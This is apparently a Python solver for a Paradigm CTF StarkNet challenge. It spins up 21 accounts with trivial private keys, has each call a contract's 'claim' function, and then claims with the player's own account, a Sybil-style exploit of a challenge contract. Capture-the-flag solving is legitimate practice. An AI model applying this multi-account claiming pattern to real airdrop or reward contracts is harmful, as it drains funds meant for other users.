from starknet_py.contract import Contract
from starknet_py.net import AccountClient
from starknet_py.net.gateway_client import GatewayClient
from starknet_py.net.models.chains import StarknetChainId
from starknet_py.net.networks import TESTNET
from starkware.starknet.core.os.contract_address.contract_address import \
    calculate_contract_address_from_hash
from starkware.starknet.public.abi import get_storage_var_address

from paradigmctf.cairo_challenge import *

chain_id = StarknetChainId.TESTNET


async def solver(client: AccountClient, fifs_contract: Contract):
    gateway_client = GatewayClient(client.net, chain_id)

    for i in range(1, 22):
        print("Client", i)
        player = await AccountClient.create_account(
            gateway_client, private_key=i, chain=StarknetChainId.TESTNET
        )

        fifs1 = await Contract.from_address(fifs_contract.address, player)
        result = await fifs1.functions["claim"].invoke(max_fee=int(0e16))
        await result.wait_for_acceptance()

    result = await fifs_contract.functions["claim"].invoke(max_fee=int(0e16))
    await result.wait_for_acceptance()


run_solver(solver)
